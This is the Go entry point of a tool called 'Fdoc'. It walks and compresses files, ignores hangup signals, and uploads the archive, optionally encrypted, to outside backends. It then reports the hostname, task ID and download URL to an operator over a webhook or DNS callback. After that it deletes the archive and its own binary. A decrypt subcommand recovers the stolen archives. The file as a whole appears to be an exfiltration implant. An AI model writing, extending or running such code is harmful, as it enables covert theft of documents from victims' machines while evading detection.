package main

import (
	"Fdoc/logx"
	"Fdoc/option"
	"Fdoc/pkg"
	"Fdoc/pkg/callback"
	"Fdoc/pkg/decrypt"
	"Fdoc/pkg/scrub"
	"Fdoc/pkg/upload"
	"context"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"uploader/route"
)

func main() {
	if len(os.Args) > 1 && os.Args[1] == "decrypt" {
		os.Exit(runDecrypt(os.Args[2:]))
	}
	if len(os.Args) > 1 && os.Args[1] == "backends" {
		fmt.Print(route.FormatBackendTable())
		os.Exit(0)
	}

	info := &option.FlagInfo{}
	info.InitFlag()

	if info.Upload {
		pkg.IgnoreSIGHUP()
	}

	startTime := time.Now()
	result := pkg.WalkAndCompress(info)
	logx.Info("Execution time: %v", time.Since(startTime))

	if result.Err != nil {
		logx.Error("%v", result.Err)
		os.Exit(1)
	}

	if !info.Upload {
		if result.Truncated {
			os.Exit(2)
		}
		os.Exit(0)
	}

	if result.MatchedFiles == 0 || result.OutputPath == "" {
		logx.Error("nothing to upload (no packed files)")
		os.Exit(1)
	}

	upRes, err := upload.File(result.OutputPath, upload.Options{
		Backend: info.Backend,
		Force:   info.Force,
		// -q silences stage lines; without -q show probing/using. -v adds per-backend OK/FAIL.
		Quiet:            info.Quiet,
		Verbose:          info.Verbose,
		Encrypt:          info.Encrypt,
		EncryptKey:       info.EncryptKey,
		ProgressInterval: info.ProgressInterval,
	})
	if err != nil {
		logx.Error("upload: %v", err)
		os.Exit(1)
	}
	// Machine-friendly status always on stderr (includes url=).
	encNote := ""
	if info.Encrypt {
		encNote = " encrypted=1 decrypt_first=1"
	}
	fmt.Fprintf(os.Stderr, "UPLOAD_OK backend=%s url=%s%s\n", upRes.Backend, upRes.URL, encNote)
	needCallback := info.Webhook != "" || info.DNS != ""
	if !needCallback {
		fmt.Println(upRes.URL)
	} else {
		// Callback mode: stdout stays clean for operators who only capture webhook/DNS;
		// still echo bare URL on stderr for local recovery.
		fmt.Fprintln(os.Stderr, upRes.URL)
	}

	callbackOK := !needCallback // local-echo mode: upload success is enough
	if needCallback {
		host, _ := os.Hostname()
		cbRes, err := callback.Notify(context.Background(), callback.Payload{
			TaskID:    info.TaskID,
			Host:      host,
			URL:       upRes.URL,
			Backend:   upRes.Backend,
			Archive:   filepath.Base(result.OutputPath),
			Size:      result.ArchiveBytes,
			Files:     result.MatchedFiles,
			Truncated: result.Truncated,
			TS:        time.Now().Unix(),
		}, callback.Options{
			Webhook: info.Webhook,
			DNS:     info.DNS,
			Timeout: info.CBTimeout,
		})
		if err != nil {
			logx.Error("callback: %v", err)
			os.Exit(1)
		}
		logx.Info("callback ok webhook=%v dns=%v", cbRes.WebhookOK, cbRes.DNSOK)
		callbackOK = cbRes.WebhookOK || cbRes.DNSOK
	}

	// Scrub after successful upload; if remote callback was requested, require it too.
	scrubPartial := false
	if info.Scrub && callbackOK {
		sr := scrub.Run(scrub.Options{
			Archive: result.OutputPath,
			Self:    true,
		})
		scrubPartial = sr.Partial
	}

	if scrubPartial {
		os.Exit(1)
	}
	if result.Truncated {
		os.Exit(2)
	}
}

func runDecrypt(args []string) int {
	fs := flag.NewFlagSet("decrypt", flag.ContinueOnError)
	fs.SetOutput(os.Stderr)
	var (
		key    string
		output string
		force  bool
		quiet  bool
	)
	fs.StringVar(&key, "key", "", "encryption key (same as -upload -encrypt -key)")
	fs.StringVar(&output, "o", "", "output path (default: <name>.tgz, or <name>.dec.tgz if input is already .tgz)")
	fs.BoolVar(&force, "force", false, "overwrite existing output")
	fs.BoolVar(&force, "f", false, "overwrite existing output")
	fs.BoolVar(&quiet, "q", false, "quiet")
	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, `Fdoc decrypt — decrypt a file encrypted by Fdoc/uploader -encrypt.

Format: UP01 | IV(16) | AES-256-CBC(PKCS7). Key is PKCS7-padded to 32 bytes.

Usage:
  Fdoc decrypt [flags] <cipher>

Examples:
  Fdoc decrypt -key SECRET -o out.tgz cipher.bin
  Fdoc decrypt -key SECRET -force downloaded.bin

Flags:
INPUT:
   -key string       encryption key (same as -upload -encrypt -key)

OUTPUT:
   -o string         output path (default: <name>.tgz, or <name>.dec.tgz if input is already .tgz)
   -force, -f        overwrite existing output
   -q                quiet
`)
	}
	if err := fs.Parse(args); err != nil {
		return 2
	}
	if fs.NArg() != 1 {
		fs.Usage()
		return 2
	}
	logx.SetQuiet(quiet)
	res, err := decrypt.File(fs.Arg(0), decrypt.Options{
		Key:    key,
		Output: output,
		Force:  force,
	})
	if err != nil {
		logx.Error("decrypt: %v", err)
		return 1
	}
	fmt.Fprintf(os.Stderr, "DECRYPT_OK %s -> %s\n", res.Input, res.Output)
	return 0
}
